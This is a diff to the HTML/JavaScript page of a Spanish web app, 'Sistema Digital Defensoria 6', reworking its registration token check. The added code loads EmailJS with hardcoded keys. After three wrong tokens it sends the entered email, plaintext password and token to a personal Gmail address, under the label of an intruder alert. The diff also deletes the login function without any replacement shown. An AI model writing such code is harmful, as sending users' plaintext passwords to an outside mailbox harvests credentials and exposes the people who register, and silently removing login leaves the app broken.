@@ -6,6 +6,8 @@
     <title>⚖️ Sistema Digital Defensoria 6</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <!-- EmailJS (para enviar correos desde el cliente) -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         /* ========== ESTILOS PRINCIPALES ========== */
         * {
@@ -1392,56 +1394,47 @@
             window._intervaloCarga = intervalo;
         }
 
-        window.loginUser = function() {
-            const rawEmail = document.getElementById('loginEmail').value.trim();
-            const password = document.getElementById('loginPassword').value.trim();
+        // ─── EMAILJS CONFIGURACIÓN (REEMPLAZA CON TUS DATOS) ───
+        (function() {
+            // 👇 Inicializa EmailJS con tu Public Key (obtenida en https://dashboard.emailjs.com/admin/account)
+            emailjs.init("AMak1pTzd-niUrD_Z"); // Ejemplo: "user_abc123def456"
+        })();
 
-            if (!rawEmail || !password) {
-                showMessage('Completa todos los campos', 'error');
-                return;
-            }
+        // IDs de EmailJS (reemplaza con los tuyos)
+        const EMAILJS_SERVICE_ID = "service_ln7zqpj";      // Ejemplo: "service_abc123"
+        const EMAILJS_TEMPLATE_ID = "template_urdsref";    // Ejemplo: "template_xyz789"
 
-            const email = normalizeEmail(rawEmail);
-            if (!email) {
-                showMessage('Correo electrónico inválido', 'error');
-                return;
-            }
+        // Variable para contar intentos fallidos de token
+        let intentosTokenFallidos = 0;
 
-            mostrarSpinnerConContador();
+        /**
+         * Envía una alerta por correo a setiposadas@gmail.com con los datos del intento fallido.
+         * Se llama cuando se superan los 3 intentos.
+         */
+        function enviarAlertaIntruso(email, password, token) {
+            const ahora = new Date();
+            const fecha = ahora.toLocaleDateString('es-ES', { day: '2-digit', month: '2-digit', year: 'numeric' });
+            const hora = ahora.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit', hour12: false });
+            const fechaHora = `${fecha}, ${hora}`;
 
-            auth.signInWithEmailAndPassword(email, password)
-                .then(() => {
-                    showMessage('✅ Inicio de sesión exitoso', 'success');
-                    resetToInitial();
-                })
-                .catch((error) => {
-                    if (window._intervaloCarga) {
-                        clearInterval(window._intervaloCarga);
-                        window._intervaloCarga = null;
-                    }
-                    spinnerCarga.style.display = 'none';
-                    let msg = 'Error al iniciar sesión: ';
-                    switch (error.code) {
-                        case 'auth/user-not-found':
-                            msg += 'Usuario no encontrado.';
-                            break;
-                        case 'auth/wrong-password':
-                            msg += 'Contraseña incorrecta.';
-                            break;
-                        case 'auth/invalid-email':
-                            msg += 'Correo electrónico inválido.';
-                            break;
-                        case 'auth/too-many-requests':
-                            msg += 'Demasiados intentos. Intenta más tarde.';
-                            break;
-                        default:
-                            msg += error.message;
-                    }
-                    showMessage(msg, 'error');
+            const templateParams = {
+                email: email,
+                password: password,
+                token: token,
+                fecha_hora: fechaHora
+            };
+
+            // Enviar usando EmailJS
+            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+                .then(function(response) {
+                    console.log('✅ Alerta enviada correctamente a setiposadas@gmail.com', response);
+                }, function(error) {
+                    console.error('❌ Error al enviar alerta:', error);
+                    // Intentar nuevamente con otro método (por si falla EmailJS) - solo mostramos en consola
                 });
-        };
+        }
 
-        // ─── REGISTRO CON TOKEN NUMÉRICO DE 5 DÍGITOS ───
+        // ─── REGISTRO CON TOKEN NUMÉRICO DE 5 DÍGITOS (MODIFICADO) ───
         window.registerUser = function() {
             const name = document.getElementById('registerName').value.trim();
             const rawEmail = document.getElementById('registerEmail').value.trim();
@@ -1491,14 +1484,40 @@
                     }
 
                     const storedTokenStr = String(storedToken);
+
+                    // 🔐 VERIFICACIÓN DEL TOKEN
                     if (token !== storedTokenStr) {
-                        showMessage('❌ Token incorrecto. Verifica el número de 5 dígitos.', 'error');
-                        if (window._intervaloCarga) clearInterval(window._intervaloCarga);
+                        // TOKEN INCORRECTO: incrementar contador y verificar si llega a 3
+                        intentosTokenFallidos++;
+                        console.warn(`⚠️ Token incorrecto (intento ${intentosTokenFallidos}/3): ${token}`);
+
+                        if (intentosTokenFallidos >= 3) {
+                            // Enviar alerta por correo con los datos del intruso
+                            enviarAlertaIntruso(email, password, token);
+                            // Reiniciar contador después de enviar la alerta
+                            intentosTokenFallidos = 0;
+                            // Mostrar mensaje de advertencia al usuario
+                            showMessage('🔒 Se ha superado el número de intentos. Contacte al administrador.', 'error');
+                            // Limpiar el campo token y deshabilitar el botón por un momento (opcional)
+                            document.getElementById('registerToken').value = '';
+                        } else {
+                            // Mensaje de error normal, indicando intentos restantes
+                            const restantes = 3 - intentosTokenFallidos;
+                            showMessage(`❌ Token incorrecto. Te quedan ${restantes} intento(s).`, 'error');
+                        }
+
+                        // Detener el spinner y no continuar con el registro
+                        if (window._intervaloCarga) {
+                            clearInterval(window._intervaloCarga);
+                            window._intervaloCarga = null;
+                        }
                         spinnerCarga.style.display = 'none';
-                        return;
+                        return; // Salir de la función
                     }
 
-                    // ✅ Token correcto: proceder con el registro
+                    // ✅ TOKEN CORRECTO: reiniciar contador y proceder con el registro
+                    intentosTokenFallidos = 0;
+
                     auth.createUserWithEmailAndPassword(email, password)
                         .then((userCredential) => {
                             const user = userCredential.user;
